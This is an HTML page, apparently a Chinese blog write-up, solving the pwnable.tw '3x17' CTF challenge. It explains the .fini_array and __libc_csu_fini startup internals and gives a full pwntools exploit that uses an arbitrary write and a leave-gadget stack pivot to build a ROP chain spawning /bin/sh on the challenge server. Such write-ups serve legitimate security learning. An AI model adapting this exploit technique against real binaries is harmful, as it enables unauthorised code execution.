@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pwnable.tw 3x17 | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="pwnable.tw 3x17" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="好难的一关，顺着这关学了好多东西……" />
+<meta property="og:description" content="好难的一关，顺着这关学了好多东西……" />
+<link rel="canonical" href="http://localhost:4001/2022/08/04/pwnable-tw-3x17-writeup.html" />
+<meta property="og:url" content="http://localhost:4001/2022/08/04/pwnable-tw-3x17-writeup.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-04T04:17:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pwnable.tw 3x17" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-04T04:17:00+08:00","datePublished":"2022-08-04T04:17:00+08:00","description":"好难的一关，顺着这关学了好多东西……","headline":"pwnable.tw 3x17","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4001/2022/08/04/pwnable-tw-3x17-writeup.html"},"url":"http://localhost:4001/2022/08/04/pwnable-tw-3x17-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4001/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">pwnable.tw 3x17</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-08-04T04:17:00+08:00" itemprop="datePublished">Aug 4, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>好难的一关，顺着这关学了好多东西……</p>
+
+<h2 id="part0-符号名呢">Part0 符号名呢</h2>
+
+<h3 id="摸索">摸索</h3>
+
+<p>本题是一个strip后的静态链接文件……
+当我打开IDA，我看不到任何一个函数名，只有一大堆地址迎接我。
+于是我在libc里耗了一天，成果只是大致知道执行了哪些函数，并且给 <code class="language-plaintext highlighter-rouge">read</code>、<code class="language-plaintext highlighter-rouge">write</code> 等库函数标了名称。</p>
+
+<p>然后我想了一个方法，我是不是可以根据函数的地址来看出这是哪一个libc版本，然后就可以给每个函数都标上名称了？然而不行。
+静态链接不像动态链接，它只把用到了的函数链接进文件，因此库函数的地址和它在库中的位置毫无关系。</p>
+
+<p>然后当天晚上做梦的时候，我梦到真的有这么一个库，我一把库拖进IDA PRO，软件自动给所有的函数都标上了名字。
+醒来的时候我一想，会不会真有根据函数特征来识别函数名的功能？拿起枕边手机一查就查到了。（话说你不能早点查吗）</p>
+
+<h3 id="解决">解决</h3>
+
+<p>参考<a href="https://blog.csdn.net/qq_29343201/article/details/74656456">利用ida pro的flare功能识别静态链接函数签名_Anciety的博客</a></p>
+
+<p>IDA支持给特定库生成一个签名，然后用这个签名识别库函数的名称！
+有人已经生成过很多签名了，可以直接去<a href="https://github.com/push0ebp/sig-database">push0ebp/sig-database: IDA FLIRT Signature Database (github.com)</a>下载。</p>
+
+<p>那么问题来了，下哪个libc版本呢？
+pwnable.tw的官网首页说，题目都运行在ubuntu16.04或18.04上，所以我先去把这两个系统对应的libc都下了下来，发现只识别了五十几个库函数……
+然后又下了一大堆libc版本，最后在19.04里找到的libc6_2.28成功匹配到了六百多个库函数。</p>
+
+<p>于是我终于知道哪个是main函数了……然后发现离成功还尚早……</p>
+
+<h2 id="part1-分析放弃">Part1 分析（<del>放弃</del>）</h2>
+
+<p>本关开启了NX和Canary，没开PIE，那么应该是可以修改某些东西的。
+main函数干了四件事：</p>
+
+<ol>
+  <li>write一个”addr:”</li>
+  <li>read一个0x18长度的字符串，并用一个库函数将其转换成数字（当成10进制数）。</li>
+  <li>write一个”data:”</li>
+  <li>read一个0x18长度的字符串，地址是刚刚输入的数。</li>
+</ol>
+
+<p>然后就ret了。可以发现，我们没有任何泄露栈地址的方法，没办法进行简单的ret2xxx系列攻击。
+（然后我就放弃了，这题大概又是超出我知识水平范围的，所以去网上找writeup：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">和媳妇一起学Pwn 之 3x17 | Clang裁缝店</a>看了）</p>
+
+<h2 id="part2-main函数的启动过程">Part2 main函数的启动过程</h2>
+
+<p>参考教程：<a href="https://blog.csdn.net/gary_ygl/article/details/8506007">linux编程之main()函数启动过程_gary_ygl的博客</a></p>
+
+<p>读了文章，学到很多姿势，尤其是对于C程序的抽象-&gt;具象：
+从一开始的程序运行过程就是 <code class="language-plaintext highlighter-rouge">main</code> 开始到结束；
+到后来知道从 <code class="language-plaintext highlighter-rouge">_start</code> 开始，它负责调用 <code class="language-plaintext highlighter-rouge">__libc_start_main()</code>，<code class="language-plaintext highlighter-rouge">__libc_start_main()</code> 再调用 <code class="language-plaintext highlighter-rouge">main()</code> 函数；
+再到现在发现 <code class="language-plaintext highlighter-rouge">__libc_start_main()</code> 干了很多事情，包括在调用 <code class="language-plaintext highlighter-rouge">main()</code> 函数之前，调用 <code class="language-plaintext highlighter-rouge">__libc_csu_init()</code> 函数，并且用 <code class="language-plaintext highlighter-rouge">_cxa_atexit()</code> 函数设置程序退出前执行 <code class="language-plaintext highlighter-rouge">__libc_csu_fini()</code> 函数（具体来说 <code class="language-plaintext highlighter-rouge">exit()</code> 调用 <code class="language-plaintext highlighter-rouge">_run_exit_handlers()</code> ，并在其中按照倒序调用之前用 <code class="language-plaintext highlighter-rouge">_cxa_atexit()</code> 注册过的函数）。并且在调用 <code class="language-plaintext highlighter-rouge">main()</code> 之后，会调用 <code class="language-plaintext highlighter-rouge">exit()</code> 函数。</p>
+
+<p>（其实还干了一些初始化以及善后工作，但是和链接比较相关，和本题不那么相关）</p>
+
+<p>而逆向本题可以看到，<code class="language-plaintext highlighter-rouge">__libc_csu_init()</code> 主要做两件事：</p>
+
+<ol>
+  <li>调用位于 <code class="language-plaintext highlighter-rouge">.init</code> 段中的 <code class="language-plaintext highlighter-rouge">_init_proc()</code></li>
+  <li>按顺序调用位于 <code class="language-plaintext highlighter-rouge">.init_array</code> 中的函数（这是一个函数指针数组）（数组大小固定，汇编中直接用立即数地址计算数组大小）</li>
+</ol>
+
+<p>类似地，<code class="language-plaintext highlighter-rouge">__libc_csu_fini()</code> 也干两件事，但是和init是正好顺序相反的：</p>
+
+<ol>
+  <li>按逆序调用位于 <code class="language-plaintext highlighter-rouge">.fini_array</code> 中的函数（这是一个函数指针数组）（数组大小固定，汇编中直接用立即数地址计算数组大小）</li>
+  <li>调用位于 <code class="language-plaintext highlighter-rouge">.fini</code> 段中的 <code class="language-plaintext highlighter-rouge">term_proc()</code></li>
+</ol>
+
+<p>然后画个图表示一下我的理解：</p>
+
+<p><img src="/images/3x17_1.jpg" alt="两个csu函数的调用顺序" /></p>
+
+<p>而 <code class="language-plaintext highlighter-rouge">.init_array</code> 和 <code class="language-plaintext highlighter-rouge">.fini_array</code> 都是rw的，可写！
+然后我决定在懂得了这些之后再自己尝试一下利用！</p>
+
+<h2 id="part3-exploitation">Part3 Exploitation</h2>
+
+<p>通过覆写一次 <code class="language-plaintext highlighter-rouge">.fini_array</code>，可以达到如图的效果。</p>
+
+<p><img src="/images/3x17_2.jpg" alt="fini&amp;main循环" /></p>
+
+<p>由于不存在wx的段，所以放弃shellcode，想想如何ROP。
+光凭 <code class="language-plaintext highlighter-rouge">.fini_array</code> 这两个call是没有用的，必须想办法stack pivot一下。</p>
+
+<p>刚开始的思路是利用</p>
+
+<pre><code class="language-asm">0x00418820: mov rax, qword [0x00000000004B7120] ; ret  ;
+0x0044f62b: xchg eax, esp ; ret  ;
+</code></pre>
+
+<p>这两个gadget来把rsp弄到我想要的地方。但是我发现这做不到，原因是 <code class="language-plaintext highlighter-rouge">.fini_array</code> 只有两个元素，我不论怎么修改这个数组，都<strong>只能实际调用一个gadget</strong>。
+原因如下：</p>
+
+<p><img src="/images/3x17_3.jpg" alt="覆盖fini_array的两种情况" /></p>
+
+<p>我们必须要用一个gadget完成stack pivot，这意味着要么有一个gadget同时涵盖了赋值+修改rsp的工作，要么利用寄存器或栈上已有的值。
+GDB动态调试到这里，发现确实有几个寄存器存着RW的位置，其中就包括rbp。然后回忆一下：<code class="language-plaintext highlighter-rouge">leave = mov rsp, rbp; pop rbp;</code> ，用这个来stack pivot。</p>
+
+<p>然后利用静态链接程序的丰富gadget库轻松写出了ROP chain，拿到了shell。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">filename</span><span class="o">=</span><span class="s">"./3x17"</span>
+<span class="c1"># io = process(["strace", filename])
+# io = process([filename])
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10105</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvrepeatS</span><span class="p">(</span><span class="mf">0.5</span><span class="p">))</span>
+
+<span class="c1"># addr
+</span><span class="n">fini_array_addr</span> <span class="o">=</span> <span class="mh">0x4b40f0</span>
+<span class="n">new_stack_addr</span> <span class="o">=</span> <span class="n">fini_array_addr</span> <span class="o">+</span> <span class="mh">0x10</span>
+<span class="n">csu_fini_addr</span> <span class="o">=</span> <span class="mh">0x402960</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x401b6d</span>
+<span class="n">sh_str_addr</span> <span class="o">=</span> <span class="mh">0x4b40e0</span>   <span class="c1"># 随便取的
+</span>
+<span class="c1"># ROP gadget
+</span><span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x0041e4af</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00401696</span>
+<span class="n">pop_rdx_rsi</span> <span class="o">=</span> <span class="mh">0x0044a309</span>
+<span class="n">mov_rax_val</span> <span class="o">=</span> <span class="mh">0x0044f62b</span>
+<span class="n">leave</span> <span class="o">=</span> <span class="mh">0x00401c4b</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x00471db5</span>
+<span class="n">return_</span> <span class="o">=</span> <span class="mh">0x00401016</span>    <span class="c1"># just a normal ret，用来占位子
+</span>
+<span class="c1"># ROP payload
+</span><span class="n">payload1</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">sh_str_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">pop_rdx_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># pwn
+</span><span class="n">write</span><span class="p">(</span><span class="n">fini_array_addr</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">csu_fini_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">main_addr</span><span class="p">))</span>
+
+<span class="n">write</span><span class="p">(</span><span class="n">sh_str_addr</span><span class="p">,</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">new_stack_addr</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">new_stack_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">new_stack_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">6</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
+
+<span class="n">write</span><span class="p">(</span><span class="n">fini_array_addr</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">return_</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">))</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>一个小技巧：
+如果不间断地给程序数据，很可能send到同一个 <code class="language-plaintext highlighter-rouge">read()</code> 里。
+面对这种情况，可以在两个 <code class="language-plaintext highlighter-rouge">send()</code> 中间 <code class="language-plaintext highlighter-rouge">recv()</code> 一下，又或者加上一个 <code class="language-plaintext highlighter-rouge">pause()</code> 手动停止，又或者加上一个 <code class="language-plaintext highlighter-rouge">sleep(0.15)</code> 来自动停止。</p>
+
+  </div><div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2022/08/04/pwnable-tw-3x17-writeup.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
